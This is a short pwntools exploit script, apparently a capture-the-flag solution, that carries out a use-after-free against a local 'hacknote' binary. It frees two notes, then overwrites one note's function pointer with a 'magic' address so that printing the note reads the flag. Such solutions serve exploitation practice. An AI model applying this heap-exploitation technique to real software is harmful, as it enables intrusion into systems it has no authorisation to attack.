#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')

p = process("./hacknote")

magic_addr = 0x08048986

p.recvuntil("Your choice :")
p.sendline("1")
p.recvuntil("Note size :") # notesize
p.sendline("48") #0x30
p.recvuntil("Content :") # content
p.sendline("hello")
p.recvuntil("Your choice :")
p.sendline("1")
p.recvuntil("Note size :") # notesize
p.sendline("48") #0x30
p.recvuntil("Content :") # content
p.sendline("world")
p.recvuntil("Your choice :")
p.sendline("2")
p.recvuntil("Index :") # index
p.sendline("0")# delete node[0]
p.recvuntil("Your choice :")
p.sendline("2")
p.recvuntil("Index :")
p.sendline("1") #delete node[1]
p.recvuntil("Your choice :")
p.sendline("1") #add node
p.recvuntil("Note size :") # notesize
p.sendline("8") # node[0] content size + node[1] size
payload =  p32(magic_addr)
p.recvuntil("Content :") # content
p.sendline(payload)
p.recvuntil("Your choice :")
p.sendline("3")# print note
p.recvuntil("Index :") # index
p.sendline("0")  #node[0]
p.recvline() #cat flag
p.close()
